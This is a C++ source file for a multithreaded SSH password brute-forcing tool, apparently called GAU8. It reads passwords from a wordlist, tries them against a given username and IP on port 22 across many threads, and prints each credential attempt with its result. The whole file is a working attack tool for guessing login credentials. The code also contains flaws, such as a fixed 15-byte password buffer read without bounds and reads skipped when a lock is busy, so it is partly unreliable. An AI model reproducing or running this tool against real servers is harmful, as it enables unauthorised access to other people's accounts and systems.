#include "./lib/connectors.hpp"
//#include <cstdio>
//#include <cstdlib>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <thread>
#include <mutex>
#include <vector>
#include <chrono>
//   /$$$$$$$  /$$$$$$$$ /$$      /$$       /$$$$$$       /$$   /$$  /$$$$$$  /$$$$$$$$        /$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$
//  | $$__  $$|__  $$__/| $$  /$ | $$      |_  $$_/      | $$  | $$ /$$__  $$| $$_____/       /$$__  $$| $$__  $$ /$$__  $$| $$  | $$
//  | $$  \ $$   | $$   | $$ /$$$| $$        | $$        | $$  | $$| $$  \__/| $$            | $$  \ $$| $$  \ $$| $$  \__/| $$  | $$
//  | $$$$$$$    | $$   | $$/$$ $$ $$        | $$        | $$  | $$|  $$$$$$ | $$$$$         | $$$$$$$$| $$$$$$$/| $$      | $$$$$$$$
//  | $$__  $$   | $$   | $$$$_  $$$$        | $$        | $$  | $$ \____  $$| $$__/         | $$__  $$| $$__  $$| $$      | $$__  $$
//  | $$  \ $$   | $$   | $$$/ \  $$$        | $$        | $$  | $$ /$$  \ $$| $$            | $$  | $$| $$  \ $$| $$    $$| $$  | $$
//  | $$$$$$$/   | $$   | $$/   \  $$       /$$$$$$      |  $$$$$$/|  $$$$$$/| $$$$$$$$      | $$  | $$| $$  | $$|  $$$$$$/| $$  | $$
//  |_______/    |__/   |__/     \__/      |______/       \______/  \______/ |________/      |__/  |__/|__/  |__/ \______/ |__/  |__/



#define LINNUX_COMMAND_ERR 128

int main(int argc, char** argv)
{

    fprintf(stdout,"GAU8....\n\n");


    if (argc < 5) {
        std::cout << "USAGE: ./gau10 ip username path_to_wordlist num_of_threads" << std::endl;;
        return LINNUX_COMMAND_ERR;
    }

    std::vector<std::thread*> threads;
    std::mutex m_lock_pass;
    std::ifstream wordlist(argv[3]);
    long long attempt_counter = 0;
//Check if all args are passed from the command line

    for(uint16_t i = 1; i <= atoi(argv[4]); i++)
    {
        //add all threads to the vector of threads 
        std::cout << "Initializing thread " << i;
        threads.push_back(new std::thread([&]{
            char f_password[15];
            while(true)
            {
                //basically create a new ssh connection and session, try 3 passwords, then kill it
                int handle;
                gau8::ssh* f_ssh = new gau8::ssh(argv[1], 22, handle);
                while(handle)
                {
                    //some ssh servers might refuse connections, so block the thread until 
                    delete f_ssh; 
                    f_ssh = new gau8::ssh(argv[1], 22, handle);
                    std::this_thread::sleep_for(std::chrono::milliseconds(250));
                }
                for(uint16_t i = 1; i <= 3; i++)
                {
                    if(m_lock_pass.try_lock())
                    {
                        //Lock the wordlist and read one password
                        wordlist >> f_password;
                        m_lock_pass.unlock();
                    }
                    //try to authenticate via the username that the connection was created with and the password that was read above
                    if(f_ssh->auth_user_pass(argv[2], f_password))
                    {
                        //raise the counter for the number of attempts
                        if(m_lock_pass.try_lock())
                        {
                            attempt_counter++;
                            m_lock_pass.unlock();
                        }
                        //print the successful attempt
                        std::cout << "ATTEMPT " << attempt_counter << " - Auth successful for user " << argv[2] << ":" << f_password << std::endl;
                    }else
                    {
                        if(m_lock_pass.try_lock())
                        {
                            attempt_counter++;
                            m_lock_pass.unlock();
                        }
                        //print the unsuccessful attempt
                        std::cout << "ATTEMPT " << attempt_counter << " - Auth failed for user " << argv[2] << ":" << f_password << std::endl;
                    }
                }
                delete f_ssh;
            }
        }));
        std::cout << " - DONE" << std::endl;
    }
    std::cin.get();
    for(uint16_t i = 0; i < atoi(argv[4]); i++)
    {
        threads[i]->join();
        delete threads[i];
    }
    return EXIT_SUCCESS;
}
